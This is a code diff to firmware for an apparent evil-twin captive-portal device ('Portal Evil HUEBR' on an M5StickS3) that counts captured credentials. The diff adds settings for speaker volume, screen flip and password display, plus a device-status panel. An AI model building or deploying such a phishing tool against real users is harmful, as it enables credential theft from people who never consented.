@@ -88,6 +88,7 @@ bool soundOn = true;             // beep when a credential is captured
 bool ledBlinkOn = true;          // blink the LED when a credential is captured
 uint8_t brightLevel = 2;         // screen brightness index (0..2)
 const uint8_t BRIGHT_VALS[3] = {64, 160, 255};  // M5.Display.setBrightness range 0..255
+uint8_t spkVol = 60;             // speaker volume 0..100 (%) -- mapped to 0..255
 uint8_t screenRot = 3;           // LCD rotation (1 or 3 = landscape, flipped)
 
 String  cfgSsid   = SSID_NAME;         // broadcast AP name (runtime-settable)
@@ -233,8 +234,10 @@ void loadSettings() {
   adminPass   = prefs.getString("apass", ADMIN_PASS_DEF);
   authOn      = prefs.getBool("auth", true);
   autoRefresh = prefs.getUChar("refresh", 15);
+  spkVol      = prefs.getUChar("vol", 60);
   capcount    = prefs.getInt("lifetime", 0);  // lifetime count, restored across reboots
   prefs.end();
+  if (spkVol > 100) spkVol = 100;
   if (brightLevel > 2) brightLevel = 2;
   if (screenRot != 1 && screenRot != 3) screenRot = 3;
   if (autoRefresh > 120) autoRefresh = 120;
@@ -247,6 +250,7 @@ void saveSettings() {
   prefs.putBool("beep", soundOn);
   prefs.putBool("led", ledBlinkOn);
   prefs.putUChar("bright", brightLevel);
+  prefs.putUChar("vol", spkVol);
   prefs.putUChar("rot", screenRot);
   prefs.putString("ssid", cfgSsid);
   prefs.putString("auser", adminUser);
@@ -495,56 +499,114 @@ String settingsPage(bool saved) {
     ".top h1{margin:0;font-size:20px}.top p{margin:3px 0 0;color:#cdd6ff;font-size:13px}"
     ".wrap{max-width:680px;margin:0 auto;padding:16px}"
     ".card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;margin:0 0 16px}"
-    ".row{margin:0 0 14px}"
+    ".sec{display:flex;align-items:center;gap:8px;font-size:12px;text-transform:uppercase;letter-spacing:.6px;"
+    "color:#8ab0ff;font-weight:700;margin:0 0 14px;padding:0 0 10px;border-bottom:1px solid var(--line)}"
+    ".row{margin:0 0 14px}.row:last-child{margin-bottom:0}"
     "label{display:block;color:var(--mut);font-size:12px;text-transform:uppercase;letter-spacing:.5px;margin:0 0 6px}"
     "input[type=text],input[type=password],input[type=number],select{width:100%;padding:10px 12px;border-radius:10px;"
     "border:1px solid var(--line);background:#10131a;color:var(--txt);font-size:15px}"
     ".chk{display:flex;align-items:center;gap:10px;color:var(--txt);font-size:15px}"
-    ".chk input{width:18px;height:18px}"
+    ".chk input{width:18px;height:18px;flex:none}"
+    ".chk .sub{display:block;color:var(--mut);font-size:12px;text-transform:none;letter-spacing:0}"
+    ".range{display:flex;align-items:center;gap:12px}.range input[type=range]{flex:1;accent-color:var(--accent)}"
+    ".vv{min-width:46px;text-align:right;color:#8ab0ff;font-weight:700}"
     ".btn{display:inline-block;padding:10px 16px;border-radius:10px;border:1px solid var(--line);background:var(--card);"
     "color:var(--txt);text-decoration:none;font-size:15px;cursor:pointer}"
     ".btn.primary{background:var(--accent);border-color:var(--accent);color:#fff}"
-    ".bar{display:flex;gap:10px;margin-top:8px}"
+    ".bar{display:flex;gap:10px;margin:0 0 20px}"
     ".saved{background:rgba(48,163,108,.15);border:1px solid var(--ok);color:#8ff0c4;border-radius:10px;padding:10px 14px;margin:0 0 16px;font-size:14px}"
-    ".hint{color:var(--mut);font-size:12px;margin:4px 0 0}";
+    ".hint{color:var(--mut);font-size:12px;margin:4px 0 0}"
+    ".status{display:flex;flex-wrap:wrap;gap:10px}"
+    ".scell{flex:1;min-width:120px;background:#10131a;border:1px solid var(--line);border-radius:10px;padding:10px 12px}"
+    ".scell .k{color:var(--mut);font-size:11px;text-transform:uppercase;letter-spacing:.5px}"
+    ".scell .v{font-size:17px;font-weight:700;margin-top:3px}";
 
   auto opt = [](int v, int cur, const char* label) -> String {
     return "<option value=\"" + String(v) + "\"" + (v == cur ? " selected" : "") + ">" + String(label) + "</option>";
   };
 
+  // Read-only device-status figures for the panel at the bottom.
+  size_t fsUsed = LittleFS.usedBytes();
+  size_t fsTot  = LittleFS.totalBytes();
+  String fsStr  = fsTot ? (String((unsigned long)(fsUsed / 1024)) + " / " + String((unsigned long)(fsTot / 1024)) + " KB")
+                        : "n/a";
+
   return
     "<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\">"
     "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">"
     "<title>" + attrEsc(cfgSsid) + " :: Settings</title><style>" + css + "</style></head><body>"
-    "<div class=\"top\"><h1>Settings</h1><p>Portal Evil HUEBR configuration</p></div>"
+    "<div class=\"top\"><h1>&#9881;&#65039; Settings</h1><p>Portal Evil HUEBR &middot; M5StickS3 configuration</p></div>"
     "<div class=\"wrap\">"
     + String(saved ? "<div class=\"saved\">\xE2\x9C\x93 Settings saved.</div>" : "") +
     "<form method=\"POST\" action=\"/settings\">"
+
+    // --- Portal ---
     "<div class=\"card\">"
+    "<div class=\"sec\">&#128246; Portal</div>"
     "<div class=\"row\"><label>AP name (SSID)</label>"
     "<input type=\"text\" name=\"ssid\" maxlength=\"31\" value=\"" + attrEsc(cfgSsid) + "\">"
     "<p class=\"hint\">Changing this restarts the access point and disconnects clients.</p></div>"
     "<div class=\"row\"><label>Dashboard auto-refresh (seconds, 0 = off)</label>"
-    "<input type=\"number\" name=\"refresh\" min=\"0\" max=\"120\" value=\"" + String(autoRefresh) + "\"></div>"
+    "<input type=\"number\" name=\"refresh\" min=\"0\" max=\"120\" value=\"" + String(autoRefresh) + "\">"
+    "<p class=\"hint\">How often the /admin dashboard reloads itself in the browser.</p></div>"
+    "</div>"
+
+    // --- Display ---
+    "<div class=\"card\">"
+    "<div class=\"sec\">&#128421;&#65039; Display</div>"
     "<div class=\"row\"><label>Screen brightness</label><select name=\"bright\">"
     + opt(0, brightLevel, "1 - Low") + opt(1, brightLevel, "2 - Medium") + opt(2, brightLevel, "3 - High") +
     "</select></div>"
+    "<div class=\"row chk\"><input type=\"checkbox\" name=\"flip\" " + String(screenRot == 1 ? "checked" : "") + ">"
+    "<span>Flip screen 180&deg;<span class=\"sub\">For wearing/holding the device the other way up.</span></span></div>"
     "</div>"
+
+    // --- Audio & feedback ---
     "<div class=\"card\">"
-    "<div class=\"row chk\"><input type=\"checkbox\" name=\"beep\" " + String(soundOn ? "checked" : "") + "><span>Beep on capture / boot</span></div>"
-    "<div class=\"row chk\"><input type=\"checkbox\" name=\"led\" " + String(ledBlinkOn ? "checked" : "") + "><span>LED blink on capture</span></div>"
+    "<div class=\"sec\">&#128266; Audio &amp; feedback</div>"
+    "<div class=\"row chk\"><input type=\"checkbox\" name=\"beep\" " + String(soundOn ? "checked" : "") + ">"
+    "<span>Beep on capture / boot</span></div>"
+    "<div class=\"row\"><label>Speaker volume</label>"
+    "<div class=\"range\"><input type=\"range\" name=\"vol\" min=\"0\" max=\"100\" value=\"" + String(spkVol) + "\" "
+    "oninput=\"document.getElementById('vv').textContent=this.value+'%'\">"
+    "<span id=\"vv\" class=\"vv\">" + String(spkVol) + "%</span></div>"
+    "<p class=\"hint\">Keep at or below 75% on battery (M5Stack guidance for the ES8311 amp).</p></div>"
+    "<div class=\"row chk\"><input type=\"checkbox\" name=\"led\" " + String(ledBlinkOn ? "checked" : "") + ">"
+    "<span>LED blink on capture<span class=\"sub\">The M5StickS3 has no user LED &mdash; effective only with an external LED on LED_PIN.</span></span></div>"
     "</div>"
+
+    // --- Security ---
     "<div class=\"card\">"
-    "<div class=\"row chk\"><input type=\"checkbox\" name=\"auth\" " + String(authOn ? "checked" : "") + "><span>Require login for this dashboard</span></div>"
+    "<div class=\"sec\">&#128272; Security</div>"
+    "<div class=\"row chk\"><input type=\"checkbox\" name=\"auth\" " + String(authOn ? "checked" : "") + ">"
+    "<span>Require login for this dashboard</span></div>"
     "<div class=\"row\"><label>Login user</label>"
     "<input type=\"text\" name=\"auser\" maxlength=\"31\" value=\"" + attrEsc(adminUser) + "\"></div>"
     "<div class=\"row\"><label>Login password</label>"
     "<input type=\"password\" name=\"apass\" maxlength=\"31\" value=\"" + attrEsc(adminPass) + "\">"
+    "<div class=\"chk\" style=\"margin-top:8px\"><input type=\"checkbox\" "
+    "onclick=\"var p=document.getElementsByName('apass')[0];p.type=this.checked?'text':'password'\">"
+    "<span>Show password</span></div>"
     "<p class=\"hint\">You will be asked to log in again after changing credentials.</p></div>"
     "</div>"
-    "<div class=\"bar\"><button class=\"btn primary\" type=\"submit\">Save</button>"
+
+    "<div class=\"bar\"><button class=\"btn primary\" type=\"submit\">&#128190; Save</button>"
     "<a class=\"btn\" href=\"/admin\">Back</a></div>"
-    "</form></div></body></html>";
+    "</form>"
+
+    // --- Device status (read-only) ---
+    "<div class=\"card\">"
+    "<div class=\"sec\">&#128202; Device status</div>"
+    "<div class=\"status\">"
+    "<div class=\"scell\"><div class=\"k\">Battery</div><div class=\"v\">" + String(getBatteryPct()) + "%</div></div>"
+    "<div class=\"scell\"><div class=\"k\">Uptime</div><div class=\"v\">" + fmtUptime(millis()) + "</div></div>"
+    "<div class=\"scell\"><div class=\"k\">Free heap</div><div class=\"v\">" + String(ESP.getFreeHeap() / 1024) + " KB</div></div>"
+    "<div class=\"scell\"><div class=\"k\">Flash used</div><div class=\"v\">" + fsStr + "</div></div>"
+    "<div class=\"scell\"><div class=\"k\">Captures (lifetime)</div><div class=\"v\">" + String(capcount) + "</div></div>"
+    "<div class=\"scell\"><div class=\"k\">Board</div><div class=\"v\">M5StickS3</div></div>"
+    "</div></div>"
+
+    "</div></body></html>";
 }
 
 // Apply a POSTed settings form: update globals and persist. Returns true if
@@ -558,9 +620,15 @@ bool applySettings() {
 
   autoRefresh = (uint8_t)constrain(webServer.arg("refresh").toInt(), 0, 120);
   brightLevel = (uint8_t)constrain(webServer.arg("bright").toInt(), 0, 2);
+  spkVol      = (uint8_t)constrain(webServer.arg("vol").toInt(), 0, 100);
   soundOn    = webServer.hasArg("beep");
   ledBlinkOn = webServer.hasArg("led");
   authOn     = webServer.hasArg("auth");
+
+  // Screen rotation: the "flip" checkbox selects 1 (flipped) vs 3 (normal).
+  uint8_t newRot = webServer.hasArg("flip") ? 1 : 3;
+  bool rotChanged = (newRot != screenRot);
+  screenRot = newRot;
 
   String u = webServer.arg("auser"); u = u.substring(0, 31);
   String p = webServer.arg("apass"); p = p.substring(0, 31);
@@ -568,6 +636,11 @@ bool applySettings() {
   adminPass = p;
 
   applyBrightness();
+  applyVolume();
+  if (rotChanged) {
+    M5.Display.setRotation(screenRot);
+    previous = -1;  // force a full dashboard repaint on the next loop tick
+  }
   saveSettings();
   return ssidChanged && portalStarted;
 }
@@ -908,6 +981,11 @@ void drawMainScreen() {
 
 void applyBrightness() {
   M5.Display.setBrightness(BRIGHT_VALS[brightLevel]);
+}
+
+// Apply the stored speaker volume (0..100%) to the M5Unified speaker (0..255).
+void applyVolume() {
+  M5.Speaker.setVolume((uint8_t)map(spkVol, 0, 100, 0, 255));
 }
 
 // Register HTTP routes once. Handlers are safe to attach before the AP is up;
@@ -1267,7 +1345,6 @@ void setup() {
   auto cfg = M5.config();
   M5.begin(cfg);      // M5Unified: auto-detects the StickS3, brings up Display/Power/Speaker
   M5.Speaker.begin();            // enable the speaker amp (via the M5PM1 PMU)
-  M5.Speaker.setVolume(160);     // keep under ~75% on battery per M5Stack guidance
 
   loadSettings();     // restore persisted config (SSID, login, toggles, lifetime)
   if (!LittleFS.begin(true)) {   // true = format on first boot / mount failure
@@ -1277,6 +1354,7 @@ void setup() {
   M5.Display.setRotation(screenRot);
   ledInit();          // no-op unless LED_PIN is set to a real GPIO
   applyBrightness();
+  applyVolume();      // restore the saved speaker volume
 
   bootScreen();       // animated splash
   registerRoutes();   // attach HTTP handlers once (AP starts later, from the menu)
